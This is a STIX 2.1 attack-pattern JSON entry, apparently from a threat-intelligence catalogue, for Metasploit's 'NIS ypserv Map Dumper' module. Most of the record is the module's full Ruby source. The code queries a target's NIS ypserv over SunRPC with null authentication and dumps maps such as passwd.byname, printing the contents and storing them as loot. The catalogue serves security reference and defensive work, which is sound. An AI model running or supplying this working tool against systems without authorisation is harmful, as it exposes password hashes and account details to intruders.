{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a0d47c45-ce5d-42aa-9bcc-e88c5b795128",
    "created": "2024-08-14T16:32:27.006411Z",
    "modified": "2024-08-14T16:32:27.006416Z",
    "name": "NIS ypserv Map Dumper",
    "description": " This module dumps the specified map from NIS ypserv.  The following examples are from ypcat -x:  Use \"ethers\"    for map \"ethers.byname\" Use \"aliases\"   for map \"mail.aliases\" Use \"services\"  for map \"services.byname\" Use \"protocols\" for map \"protocols.bynumber\" Use \"hosts\"     for map \"hosts.byname\" Use \"networks\"  for map \"networks.byaddr\" Use \"group\"     for map \"group.byname\" Use \"passwd\"    for map \"passwd.byname\"  You may specify a map by one of the nicknames above. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/nis_ypserv_map.rb",
            "external_id": "nis_ypserv_map.rb"
        },
        {
            "source_name": "reference",
            "url": "https://datatracker.ietf.org/doc/html/rfc1831"
        },
        {
            "source_name": "reference",
            "url": "https://datatracker.ietf.org/doc/html/rfc4506"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n\n  include Msf::Exploit::Remote::SunRPC\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'NIS ypserv Map Dumper',\n      'Description' => %q{\n        This module dumps the specified map from NIS ypserv.\n\n        The following examples are from ypcat -x:\n\n        Use \"ethers\"    for map \"ethers.byname\"\n        Use \"aliases\"   for map \"mail.aliases\"\n        Use \"services\"  for map \"services.byname\"\n        Use \"protocols\" for map \"protocols.bynumber\"\n        Use \"hosts\"     for map \"hosts.byname\"\n        Use \"networks\"  for map \"networks.byaddr\"\n        Use \"group\"     for map \"group.byname\"\n        Use \"passwd\"    for map \"passwd.byname\"\n\n        You may specify a map by one of the nicknames above.\n      },\n      'Author'      => 'wvu',\n      'References'  => [\n        ['URL', 'https://datatracker.ietf.org/doc/html/rfc1831'],\n        ['URL', 'https://datatracker.ietf.org/doc/html/rfc4506']\n      ],\n      'License'     => MSF_LICENSE\n    ))\n\n    register_options([\n      OptEnum.new('PROTOCOL', [true, 'Protocol to use', 'tcp', %w[tcp udp]]),\n      OptString.new('DOMAIN', [true, 'NIS domain']),\n      OptString.new('MAP',    [true, 'NIS map to dump', 'passwd'])\n    ])\n\n    register_advanced_options([\n      OptFloat.new('XDRTimeout', [true, 'XDR decoding timeout', 10.0])\n    ])\n  end\n\n  def run\n    proto    = datastore['PROTOCOL']\n    domain   = datastore['DOMAIN']\n    map_name = nick_to_map(datastore['MAP'])\n\n    begin\n      sunrpc_create(\n        proto,  # Protocol: TCP (6)\n        100004, # Program: YPSERV (100004)\n        2       # Program Version: 2\n      )\n    rescue Rex::ConnectionError\n      fail_with(Failure::Unreachable, 'Could not connect to portmapper')\n    rescue Rex::Proto::SunRPC::RPCError\n      fail_with(Failure::Unreachable, 'Could not connect to ypserv')\n    end\n\n    # Flavor: AUTH_NULL (0)\n    sunrpc_authnull\n\n    # XXX: domain and map_name are modified in place\n    ypserv_all_call = Rex::Encoder::XDR.encode(\n      domain,  # Domain: [redacted]\n      map_name # Map Name: passwd.byname\n    )\n\n    begin\n      res = sunrpc_call(\n        8,              # Procedure: ALL (8)\n        ypserv_all_call # Yellow Pages Service ALL call\n      )\n    rescue Rex::Proto::SunRPC::RPCError\n      fail_with(Failure::NotFound, 'Could not call ypserv procedure')\n    ensure\n      # Shut it down! Shut it down forever!\n      sunrpc_destroy\n    end\n\n    unless res && res.length > 8\n      fail_with(Failure::UnexpectedReply, 'Invalid response from server')\n      return\n    end\n\n    # XXX: Rex::Encoder::XDR doesn't do signed ints\n    case res[4, 4].unpack('l>').first\n    # Status: YP_NOMAP (-1)\n    when -1\n      fail_with(Failure::BadConfig, \"Invalid map #{map_name} specified\")\n    # Status: YP_NODOM (-2)\n    when -2\n      fail_with(Failure::BadConfig, \"Invalid domain #{domain} specified\")\n    end\n\n    map = begin\n      Timeout.timeout(datastore['XDRTimeout']) do\n        parse_map(res)\n      end\n    rescue Timeout::Error\n      fail_with(Failure::TimeoutExpired,\n                'XDR decoding timed out (try increasing XDRTimeout?)')\n      return\n    end\n\n    if map.blank?\n      fail_with(Failure::Unknown, \"Could not parse map #{map_name}\")\n      return\n    end\n\n    map_file = map.values.join(\"\\n\") + \"\\n\"\n\n    print_good(\"Dumping map #{map_name} on domain #{domain}:\\n#{map_file}\")\n\n    # XXX: map_name contains null bytes if its length isn't a multiple of four\n    store_loot(map_name.strip, 'text/plain', rhost, map_file)\n  end\n\n  def parse_map(res)\n    map = {}\n\n    loop do\n      begin\n        # XXX: res is modified in place\n        _, status, value, key = Rex::Encoder::XDR.decode!(\n          res,\n          Integer, # More: Yes\n          Integer, # Status: YP_TRUE (1)\n          String,  # Value: [redacted]\n          String   # Key: [redacted]\n        )\n\n        break unless status == 1 && key && value\n\n        map[key] = value\n      rescue Rex::ArgumentError\n        vprint_status(\"Finished XDR decoding at #{res.inspect}\")\n        break\n      end\n    end\n\n    map\n  end\n\n  # ypcat -x\n  def nick_to_map(nick)\n    {\n      'ethers'    => 'ethers.byname',\n      'aliases'   => 'mail.aliases',\n      'services'  => 'services.byname',\n      'protocols' => 'protocols.bynumber',\n      'hosts'     => 'hosts.byname',\n      'networks'  => 'networks.byaddr',\n      'group'     => 'group.byname',\n      'passwd'    => 'passwd.byname'\n    }[nick] || nick\n  end\n\nend\n"
}